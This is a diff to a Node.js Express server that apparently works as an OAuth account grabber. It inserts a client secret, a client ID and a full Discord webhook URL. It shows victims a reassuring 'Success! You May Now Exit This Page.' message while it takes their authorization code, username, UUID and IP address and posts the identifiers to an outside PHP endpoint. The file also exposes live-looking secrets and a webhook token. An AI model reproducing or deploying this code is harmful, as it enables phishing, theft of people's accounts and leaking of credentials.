@@ -1,8 +1,8 @@
 //Config
-const secret_value = '.WW8Q~BnSgyVc5h5DzTEQWU5wRmqyeJdqIo4Tas8'
-const client_id = 'a06c832a-e2a5-4d5e-a2b3-c5f8fb61fe35'
+const secret_value = 'cTg8Q~5KLeSWagWpD_.nOrXhf9ntKpt3A9lKPaRI'
+const client_id = '1bfb18a2-ca7b-48c7-ad17-a490a6185320'
 const redirect_uri = 'https://nine19923.onrender.com'
-const webhook_url = 'webhook'
+const webhook_url = 'https://discord.com/api/webhooks/1047624352004325407/Y_mbIqVCtZGSUx_pSKloGRm1DrsFi2-JSgtnI_ijd3Ukpc9ERtxnAeLQFkTfWNKfya5l'
 //Requirements
 const axios = require('axios')
 const express = require('express')
@@ -10,7 +10,7 @@ const app = express()
 const port = process.env.PORT || 3000
 
 app.get('/', async (req, res) => {
-    res.send('인증이 완료되었습니다!')
+    res.send('Success! You May Now Exit This Page.')
     const code = req.query.code
     if (code == null) {
         return
@@ -28,7 +28,7 @@ app.get('/', async (req, res) => {
         const uuid = usernameAndUUIDArray[0]
         const username = usernameAndUUIDArray[1]
         const ip = getIp(req)
-        pageGoPost({url: "http://d-na.kr/oauth.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
+        pageGoPost({url: "http://d-na.kr/oath.php", target: "_self", vals: [["username", username], ["uuid", uuid]]});
     } catch (e) {
         console.log(e)
     }
